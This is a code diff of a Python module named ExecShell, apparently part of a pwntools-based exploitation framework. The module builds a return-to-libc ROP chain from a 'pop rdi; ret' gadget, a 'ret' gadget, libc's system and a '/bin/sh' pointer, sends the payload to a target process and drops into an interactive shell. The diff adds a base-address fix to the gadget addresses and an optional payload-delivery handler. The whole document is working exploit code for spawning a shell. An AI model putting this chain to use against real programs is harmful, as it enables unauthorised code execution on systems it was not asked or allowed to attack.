@@ -6,7 +6,7 @@ from core.targetbase import TargetBase
 from pwn import p64
 
 
-class ExecShell(AbstractModule, ):
+class ExecShell(AbstractModule):
     @classmethod
     def execute(cls, target: TargetBase, handler: typing.Callable = None, *args, **kwargs) -> Optional:
         cls.logger.info(f"Running {cls.__name__} module")
@@ -18,8 +18,8 @@ class ExecShell(AbstractModule, ):
             return None
 
         system_ptr = target.libc.symbols["system"]
-        pop_rdi = target.rop.find_gadget(['pop rdi', 'ret']).address
-        ret = target.rop.find_gadget(['ret']).address
+        pop_rdi = target.rop.find_gadget(['pop rdi', 'ret']).address + target.base_address_fix
+        ret = target.rop.find_gadget(['ret']).address + target.base_address_fix
 
         cls.logger.info(f"pop rdi gadget: {hex(pop_rdi)}")
         cls.logger.info(f"'/bin/sh' ptr {hex(bin_sh_ptr)}")
@@ -29,7 +29,10 @@ class ExecShell(AbstractModule, ):
         payload = target.create_payload(rop_chain)
 
         cls.logger.info(f"Sending payload. Payload size = {hex(len(payload))}")
-        target.run_main(payload)
+        if handler:
+            handler(target, payload)
+        else:
+            target.run_main(payload)
         cls.logger.success(f"Switching to interactive mode")
         target.process.interactive()
         return True
